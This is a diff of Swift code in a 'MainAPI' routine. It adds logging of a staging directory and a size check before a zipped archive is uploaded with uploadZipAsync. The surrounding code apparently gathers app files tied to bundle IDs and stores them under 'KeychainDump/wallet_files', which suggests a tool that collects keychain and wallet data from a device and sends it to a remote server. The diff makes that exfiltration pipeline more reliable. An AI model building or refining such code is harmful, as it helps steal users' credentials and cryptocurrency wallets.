@@ -704,10 +704,15 @@ enum MainAPI {
         // 诊断：记录暂存树前几项，验证目录结构没被压平。
         if let st = fm.enumerator(atPath: staging.path) {
             var shown = 0
-            while let name = st.nextObject() as? String, shown < 6 {
-                globallogger.log("(api) staging entry: \(name)")
-                shown += 1
+            var total = 0
+            while let name = st.nextObject() as? String {
+                if shown < 12 {
+                    globallogger.log("(api) staging entry: \(name)")
+                    shown += 1
+                }
+                total += 1
             }
+            globallogger.log("(api) staging tree: \(total) entries, \(collected) item(s) copied")
         }
 
         if collected == 0 {
@@ -733,6 +738,14 @@ enum MainAPI {
             return false
         }
         globallogger.log("(api) zip built: \(fileName) files=\(collected) bytes=\(data.count)")
+        // Never upload an empty/broken archive: an EOCD-only zip is 22 bytes.
+        // Refusing here keeps bad data off the server and out of wallet_files.
+        if data.count < 64 {
+            globallogger.log("(api) zip too small (\(data.count) B) — treating as failure, not uploading")
+            try? fm.removeItem(at: staging)
+            try? fm.removeItem(at: zipURL)
+            return false
+        }
         uploadZipAsync(data, fileName: fileName, bundleID: bid)
 
         // 本地留档（KeychainDump/wallet_files）
